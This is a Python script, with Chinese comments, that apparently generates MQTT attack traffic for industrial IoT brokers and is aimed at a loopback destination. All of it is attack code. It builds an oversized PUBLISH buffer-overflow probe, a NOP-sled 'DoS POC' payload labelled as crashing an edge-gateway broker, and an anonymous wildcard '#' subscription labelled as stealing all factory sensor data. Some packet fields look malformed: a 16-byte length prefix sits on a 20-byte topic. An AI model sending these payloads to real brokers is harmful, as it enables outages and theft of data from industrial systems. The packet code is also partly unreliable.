from mqtt_base import *

DEST = LOOPBACK_DST

# 漏洞1：超长载荷缓冲区溢出探测（0x41填充）
def scan_payload_overflow():
    topic = struct.pack(">H", 16) + b"factory/line1/sensor"
    overflow_data = b"A" * 4096
    full_payload = topic + overflow_data
    frame = build_mqtt_pkt(msg_type=3, flag=0, payload=full_payload)
    send_mqtt_tcp_pkt(DEST, sport=63000, full_mqtt_frame=frame)
    MQTTLog.warn("MQTT原生漏洞探测：超长PUBLISH载荷缓冲区溢出扫描包(0x41填充)")

# 漏洞2：匿名通配符#越权订阅探测
def scan_wildcard_sub_bypass():
    # SUBSCRIBE报文，通配符#订阅全部设备主题，无鉴权窃取数据
    sub_head = struct.pack(">H", 1)
    topic_wild = struct.pack(">H1sB", 1, b"#", 0)
    sub_payload = sub_head + topic_wild
    frame = build_mqtt_pkt(msg_type=8, flag=0, payload=sub_payload)
    send_mqtt_tcp_pkt(DEST, sport=63001, full_mqtt_frame=frame)
    MQTTLog.warn("MQTT原生漏洞探测：匿名通配符#越权订阅，窃取全厂物联网传感数据")

# POC1：缓冲区溢出DoS攻击载荷（NOP雪橇0x90）
def poc_overflow_dos():
    topic = struct.pack(">H", 16) + b"factory/line1/sensor"
    exp_shell = b"\x90" * 256 + b"\xff\xff\xff\xff"
    full_payload = topic + exp_shell
    frame = build_mqtt_pkt(msg_type=3, flag=0, payload=full_payload)
    send_mqtt_tcp_pkt(DEST, sport=63002, full_mqtt_frame=frame)
    MQTTLog.exploit("MQTT DoS攻击POC：载荷溢出导致边缘网关Broker崩溃离线")

# POC2：全量数据窃取POC
def poc_wildcard_leak():
    sub_head = struct.pack(">H", 1)
    topic_all = struct.pack(">H1sB", 1, b"#", 0)
    sub_payload = sub_head + topic_all
    frame = build_mqtt_pkt(msg_type=8, flag=0, payload=sub_payload)
    send_mqtt_tcp_pkt(DEST, sport=63003, full_mqtt_frame=frame)
    MQTTLog.exploit("MQTT数据窃取POC：越权订阅全部主题，泄露生产传感、设备状态敏感数据")

if __name__ == "__main__":
    print("===== MQTT 工业物联网原生漏洞扫描 + POC攻击流量生成 =====")
    scan_payload_overflow()
    scan_wildcard_sub_bypass()
    poc_overflow_dos()
    poc_wildcard_leak()
    print("===== 攻击流量发送完成，Wireshark过滤 tcp.port == 1883 查看恶意报文 =====\n")